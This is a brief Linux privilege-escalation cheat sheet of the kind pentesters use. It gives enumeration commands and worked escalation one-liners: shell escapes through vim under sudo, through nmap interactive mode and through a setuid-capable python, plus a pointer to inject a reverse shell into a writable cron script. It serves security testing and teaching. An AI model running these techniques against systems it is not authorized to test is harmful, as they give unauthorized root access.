# Linux - Privilege Escalation Vectors

After collecting enumeration data, correlate your findings with known privilege escalation paths. These may involve sudo misconfigurations, vulnerable SUID binaries, cron jobs, capabilities, kernel exploits, or writable scripts.

---

## Common Paths & Validation Commands

```bash
# Check sudo rights
sudo -l

# List writable files owned by root
find / -writable -uid 0 -type f 2>/dev/null

# Identify unusual SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep -v -e '/bin/' -e '/sbin/'

# Check cron jobs owned by root
cat /etc/crontab
ls -l /etc/cron.d/ /var/spool/cron/crontabs/

# Identify file capabilities
getcap -r / 2>/dev/null

# Kernel version for exploit suggestion
uname -r
```

---

## Example Paths

- **Sudo rights abuse**  
  ```bash
  $ sudo -l
  (ALL : ALL) NOPASSWD: /usr/bin/vim
  ```
  → Use GTFOBins technique: `sudo vim -c '!sh'`

- **Writable script in cron**
  ```bash
  $ ls -l /etc/cron.d/backup
  -rw-rw-r-- 1 root john  /etc/cron.d/backup
  ```
  → Inject reverse shell into the script.

- **SUID on nmap**
  ```bash
  $ /usr/bin/nmap --interactive
  nmap> !sh
  ```

- **Exploitable capabilities**
  ```bash
  $ getcap /usr/bin/python3.8
  /usr/bin/python3.8 = cap_setuid+ep
  $ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  ```

---

## Notes

- Always validate GTFOBins techniques for allowed sudo/SUID binaries.
- Look for misconfigured services, writable service unit files, or wildcards in cron.
- Use exploit suggester tools (e.g., `linux-exploit-suggester.sh`) for kernel-specific exploits.
- Use LinPEAS or LinEnum for automated checks and validation.

---

## References

- [HackTricks – Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)  
- [GTFOBins – Escalation via Binaries](https://gtfobins.github.io)  
- [LinPEAS – Automated Local PE Enumeration](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
